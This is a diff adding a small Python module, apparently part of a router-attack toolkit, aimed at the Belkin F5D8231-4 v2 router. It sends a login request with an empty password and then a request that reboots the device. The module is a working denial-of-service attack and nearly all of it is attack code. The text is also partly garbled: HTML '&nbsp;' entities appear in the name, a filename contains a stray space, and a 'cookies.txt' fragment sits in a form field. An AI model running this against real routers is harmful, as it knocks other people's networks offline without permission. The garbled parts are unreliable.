@@ -1,0 +1,16 @@
+"""
+Belkin&nbsp;Router&nbsp;F5D8231-4&nbsp;v2
+"""
+
+vendor = 'Belkin'
+name = 'Belkin&nbsp;Router&nbsp;F5D8231-4&nbsp;v2'
+regex = r''
+
+# step #1
+data = u'pws=&todo=login&this_file=login.html&next_file=ut_reset.html&message=\r\ncookies.txt'
+post('http://{routerip}', data=data)
+
+# step #2
+data = u'reboot=Restart+Router&todo=reboot&this_file=ut_reset.html&next_file=reset_o k.html&message=\r\ncookies.txt'
+post('http://{routerip}', data=data)
+
